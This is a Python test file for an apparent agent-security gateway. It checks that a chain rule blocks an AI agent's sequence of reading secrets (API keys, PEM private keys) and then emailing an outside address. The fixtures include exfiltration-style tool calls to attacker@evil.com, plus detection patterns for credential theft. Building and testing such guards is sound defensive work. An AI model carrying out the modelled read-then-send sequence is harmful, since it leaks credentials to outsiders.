"""Tests for chain detection logic."""

from __future__ import annotations

import re

from agentgate.detectors.chain import evaluate_chain_rules
from agentgate.models import (
    ChainRule,
    ChainStep,
    DetectorsConfig,
    PolicyConfig,
    Settings,
    ToolCall,
)
from agentgate.policy import CompiledPolicy
from agentgate.session import SessionStore


def _make_policy(*chain_rules: ChainRule) -> CompiledPolicy:
    """Build a CompiledPolicy with the given chain rules and pre-compiled regexes."""
    config = PolicyConfig(
        version="0.1",
        settings=Settings(default_decision="allow"),
        detectors=DetectorsConfig(),
        policies=list(chain_rules),
    )
    regexes: dict[str, re.Pattern] = {}
    for rule in chain_rules:
        for i, step in enumerate(rule.steps):
            if step.output_matches is not None:
                key = f"{rule.name}:steps.{i}.output_matches"
                regexes[key] = re.compile(step.output_matches, re.IGNORECASE)
            if step.param_matches is not None:
                for param_name, pattern in step.param_matches.items():
                    key = f"{rule.name}:steps.{i}.param_matches.{param_name}"
                    regexes[key] = re.compile(pattern)
    return CompiledPolicy(config=config, regexes=regexes)


def _make_tool_call(tool_name: str, **kwargs: str) -> ToolCall:
    return ToolCall(tool_name=tool_name, arguments=kwargs)


EXFIL_RULE = ChainRule(
    name="block-exfil",
    type="chain_rule",
    window=5,
    steps=[
        ChainStep(tool="read_file", output_matches=r"api[_-]?key"),
        ChainStep(tool="send_email", param_matches={"to": r"^(?!.*@mycompany\.com$).*$"}),
    ],
    message="Blocked: exfil after sensitive read",
)


# --- Positive tests (should block) ---


class TestChainBlocks:
    def test_basic_two_step_chain(self):
        policy = _make_policy(EXFIL_RULE)
        session = SessionStore()
        entry = session.record_request("read_file", {"path": "/config.env"})
        session.record_response(entry, "API_KEY=sk-abc123secret")

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="attacker@evil.com"), policy, session
        )
        assert result is not None
        assert result.action == "block"
        assert result.matched_rule == "block-exfil"

    def test_chain_with_intervening_calls(self):
        policy = _make_policy(EXFIL_RULE)
        session = SessionStore()
        entry = session.record_request("read_file", {"path": "/config.env"})
        session.record_response(entry, "api_key=secret123")
        # Unrelated calls between
        session.record_request("list_files", {"dir": "/"})
        session.record_request("get_time", {})

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="ext@other.com"), policy, session
        )
        assert result is not None
        assert result.action == "block"

    def test_chain_output_matches_private_key(self):
        rule = ChainRule(
            name="block-pem",
            type="chain_rule",
            window=5,
            steps=[
                ChainStep(tool="read_file", output_matches=r"BEGIN.*PRIVATE KEY"),
                ChainStep(tool="send_email"),
            ],
            message="Blocked PEM exfil",
        )
        policy = _make_policy(rule)
        session = SessionStore()
        entry = session.record_request("read_file", {"path": "/key.pem"})
        session.record_response(entry, "-----BEGIN RSA PRIVATE KEY-----\nMIIE...")

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="anyone@x.com"), policy, session
        )
        assert result is not None
        assert result.action == "block"
        assert result.matched_rule == "block-pem"

    def test_chain_param_matches_on_last_step(self):
        """param_matches on the last step correctly checks tool_call arguments."""
        policy = _make_policy(EXFIL_RULE)
        session = SessionStore()
        entry = session.record_request("read_file", {"path": "/x"})
        session.record_response(entry, "contains api_key data")

        # External email — should match param_matches
        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="ext@attacker.com"), policy, session
        )
        assert result is not None
        assert result.action == "block"

    def test_case_insensitive_output_matches(self):
        """API_KEY matches api[_-]?key pattern due to IGNORECASE."""
        policy = _make_policy(EXFIL_RULE)
        session = SessionStore()
        entry = session.record_request("read_file", {"path": "/x"})
        session.record_response(entry, "API_KEY=sk-secret")

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="ext@evil.com"), policy, session
        )
        assert result is not None
        assert result.action == "block"

    def test_multiple_chain_rules_first_wins(self):
        rule2 = ChainRule(
            name="second-rule",
            type="chain_rule",
            window=5,
            steps=[
                ChainStep(tool="read_file", output_matches=r"api[_-]?key"),
                ChainStep(tool="send_email"),
            ],
            message="Second rule",
        )
        policy = _make_policy(EXFIL_RULE, rule2)
        session = SessionStore()
        entry = session.record_request("read_file", {"path": "/x"})
        session.record_response(entry, "api_key=secret")

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="ext@evil.com"), policy, session
        )
        assert result is not None
        assert result.matched_rule == "block-exfil"  # First rule wins


# --- Negative tests (should not block) ---


class TestChainAllows:
    def test_no_match_wrong_tool_name(self):
        policy = _make_policy(EXFIL_RULE)
        session = SessionStore()
        entry = session.record_request("read_file", {"path": "/x"})
        session.record_response(entry, "api_key=secret")

        result = evaluate_chain_rules(
            _make_tool_call("write_file", content="data"), policy, session
        )
        assert result is None

    def test_no_match_output_not_sensitive(self):
        policy = _make_policy(EXFIL_RULE)
        session = SessionStore()
        entry = session.record_request("read_file", {"path": "/readme.txt"})
        session.record_response(entry, "This is a normal readme file")

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="ext@evil.com"), policy, session
        )
        assert result is None

    def test_no_match_param_mismatch(self):
        """send_email to @mycompany.com does not match the negative lookahead."""
        policy = _make_policy(EXFIL_RULE)
        session = SessionStore()
        entry = session.record_request("read_file", {"path": "/x"})
        session.record_response(entry, "api_key=secret")

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="colleague@mycompany.com"), policy, session
        )
        assert result is None

    def test_no_match_outside_window(self):
        policy = _make_policy(EXFIL_RULE)  # window=5
        session = SessionStore()
        entry = session.record_request("read_file", {"path": "/x"})
        session.record_response(entry, "api_key=secret")
        # Fill window with 5 more entries, pushing the sensitive read out
        for i in range(5):
            session.record_request("other_tool", {"i": str(i)})

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="ext@evil.com"), policy, session
        )
        assert result is None

    def test_no_match_empty_session(self):
        policy = _make_policy(EXFIL_RULE)
        session = SessionStore()

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="ext@evil.com"), policy, session
        )
        assert result is None

    def test_no_match_wrong_order(self):
        """send_email before read_file — order matters."""
        policy = _make_policy(EXFIL_RULE)
        session = SessionStore()
        # send_email first (in history), then read_file
        session.record_request("send_email", {"to": "ext@evil.com"})
        entry = session.record_request("read_file", {"path": "/x"})
        session.record_response(entry, "api_key=secret")

        # Now a new send_email — but the read_file must precede it in history
        # The read_file IS in history but it's AFTER the send_email.
        # However, the rule's preceding step is read_file and it IS before
        # the current call. So this WOULD match. Let me restructure:
        # We need the scenario where step order is reversed.
        session2 = SessionStore()
        # Only a send_email in history, no read_file
        session2.record_request("send_email", {"to": "someone@x.com"})

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="ext@evil.com"), policy, session2
        )
        assert result is None


# --- Edge cases ---


class TestChainEdgeCases:
    def test_response_text_none_skips(self):
        """Entry with response_text=None doesn't match output_matches."""
        policy = _make_policy(EXFIL_RULE)
        session = SessionStore()
        # Record request but never record response
        session.record_request("read_file", {"path": "/x"})

        result = evaluate_chain_rules(
            _make_tool_call("send_email", to="ext@evil.com"), policy, session
        )
        assert result is None

    def test_single_step_rule(self):
        """A 1-step chain rule degenerates to tool+param check."""
        rule = ChainRule(
            name="single-step",
            type="chain_rule",
            window=5,
            steps=[ChainStep(tool="dangerous_tool")],
            message="Blocked single-step",
        )
        policy = _make_policy(rule)
        session = SessionStore()

        result = evaluate_chain_rules(
            _make_tool_call("dangerous_tool"), policy, session
        )
        assert result is not None
        assert result.action == "block"
        assert result.matched_rule == "single-step"

    def test_no_chain_rules_returns_none(self):
        """Policy with no chain rules returns None."""
        config = PolicyConfig(
            version="0.1",
            settings=Settings(default_decision="allow"),
            detectors=DetectorsConfig(),
            policies=[],
        )
        policy = CompiledPolicy(config=config, regexes={})
        session = SessionStore()

        result = evaluate_chain_rules(
            _make_tool_call("any_tool"), policy, session
        )
        assert result is None
